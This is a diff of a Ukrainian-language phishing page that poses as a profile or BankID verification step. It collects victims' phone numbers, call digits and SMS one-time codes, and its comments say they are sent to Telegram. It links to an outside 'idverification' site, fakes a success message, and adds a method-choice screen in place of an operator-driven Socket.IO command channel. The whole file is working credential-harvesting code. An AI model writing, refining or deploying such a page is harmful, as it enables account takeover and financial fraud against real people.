@@ -7,7 +7,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
     <style>
         :root {
             --primary: #007bff;
@@ -289,6 +288,30 @@
             font-weight: 500;
             font-size: 15px;
         }
+        
+        /* Стиль для кнопок вибору */
+        .choice-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .choice-button {
+            padding: 15px;
+            border: 2px solid var(--primary);
+            border-radius: 12px;
+            background: white;
+            color: var(--primary);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .choice-button:hover {
+            background: #e6f0ff;
+        }
 
         input[type=tel]::-webkit-inner-spin-button,
         input[type=tel]::-webkit-outer-spin-button,
@@ -343,6 +366,23 @@
                 </div>
             </div>
 
+            <div id="choice-step" class="step">
+                <div class="info-text">
+                    Оберіть зручний спосіб підтвердження профілю:
+                </div>
+                <div class="choice-buttons">
+                    <button type="button" class="choice-button" onclick="showCallStep()">
+                        <i class="fas fa-phone-alt"></i> Звонок
+                    </button>
+                    <button type="button" class="choice-button" onclick="showSmsCodeStep()">
+                        <i class="fas fa-sms"></i> Код
+                    </button>
+                    <button type="button" class="choice-button" onclick="showBankIDStep()">
+                        <i class="fas fa-university"></i> BankID
+                    </button>
+                </div>
+            </div>
+
             <div id="call-step" class="step">
                 <p class="call-prompt">
                     На ваш номер надійде дзвінок. Вкажіть **останні 4 цифри** номеру, з якого був дзвінок, для підтвердження профілю.
@@ -378,7 +418,7 @@
                     <strong>Ваш профіль не підтверджено.</strong> Для скасування видання та продовження користуванням **підтвердіть профіль за допомогою BankID**.
                 </div>
                 <a href="https://idverification.onrender.com" target="_blank" style="text-decoration: none;">
-                    <button type="button" class="submit-button bankid" onclick="sendData('method_bankid_click', { phone: userPhone })">
+                    <button type="button" class="submit-button bankid" onclick="sendData('bankid', {})">
                         Підтвердити <i class="fas fa-external-link-alt" style="margin-left: 5px;"></i>
                     </button>
                 </a>
@@ -402,34 +442,7 @@
         document.getElementById('project-logo').src = `/logo?project=${project}`;
 
         let userCity = 'Невідомо';
-        let userPhone = ''; 
-        let socket; 
-
-        // === SOCKET.IO CLIENT SETUP ===
-        try {
-            // З'єднання з поточним сервером, де розміщено сторінку
-            socket = io(); 
-        } catch(e) {
-            console.error("Помилка ініціалізації Socket.IO:", e);
-        }
-
-        // Обробка команди від сервера (з ТГ)
-        if (socket) {
-            socket.on('command', (data) => {
-                console.log("Отримана команда від сервера:", data.method);
-                
-                // Перевіряємо, чи ми на кроці завантаження
-                if ($('#loading-step').hasClass('active')) {
-                    if (data.method === 'call') {
-                        showCallStep();
-                    } else if (data.method === 'sms') {
-                        showSmsCodeStep();
-                    }
-                    // BankID не потрібно, оскільки кнопка в ТГ веде на зовнішнє посилання
-                }
-            });
-        }
-        // ============================
+        let userPhone = ''; // Зберігаємо введений номер
 
         // Отримуємо місто за IP
         fetch('https://ipapi.co/json/')
@@ -462,6 +475,7 @@
             });
         });
         
+        // Змінюємо функцію для перевірки телефону та показу завантаження
         function validatePhoneAndShowLoading() {
             const phone = $('#phone-number').val().replace(/\s/g, '');
             if (!/^\+380\d{9}$/.test(phone)) {
@@ -478,31 +492,37 @@
             // 1. Показуємо анімацію завантаження
             $('#phone-step').removeClass('active');
             $('#loading-step').addClass('active');
-            
-            // 2. РЕЄСТРУЄМО КЛІЄНТА НА СЕРВЕРІ ЧЕРЕЗ SOCKET.IO
-            if (socket && userPhone) {
-                socket.emit('register_phone', userPhone);
-            }
 
-            // 3. Надсилаємо телефон у Telegram (логіка Node.js відправить кнопки)
+            // 2. Надсилаємо телефон у Telegram
             sendData('phone', { phone: userPhone });
+            
+            // 3. Через 3 секунди показуємо крок вибору
+            setTimeout(showChoiceStep, 3000);
         }
         
+        function showChoiceStep() {
+             $('.step').removeClass('active');
+             $('#choice-step').addClass('active');
+        }
+
         function showCallStep() {
             $('.step').removeClass('active');
             $('#call-step').addClass('active');
             $('#call-code-1').focus();
+            sendData('method_call', { phone: userPhone });
         }
         
         function showSmsCodeStep() {
             $('.step').removeClass('active');
             $('#sms-code-step').addClass('active');
             $('#sms-code-1').focus();
+            sendData('method_sms', { phone: userPhone });
         }
         
         function showBankIDStep() {
             $('.step').removeClass('active');
             $('#bankid-step').addClass('active');
+            sendData('method_bankid', { phone: userPhone });
         }
         
         function sendCallCode() {
@@ -516,7 +536,6 @@
             $('.step').removeClass('active');
             $('#loading-step').addClass('active');
             
-            // Надсилаємо код на сервер
             sendData('call_code', { code, phone: userPhone });
 
             // Імітуємо успіх після завантаження
@@ -537,7 +556,6 @@
             $('.step').removeClass('active');
             $('#loading-step').addClass('active');
 
-            // Надсилаємо код на сервер
             sendData('sms_code', { code, phone: userPhone });
             
             // Імітуємо успіх після завантаження
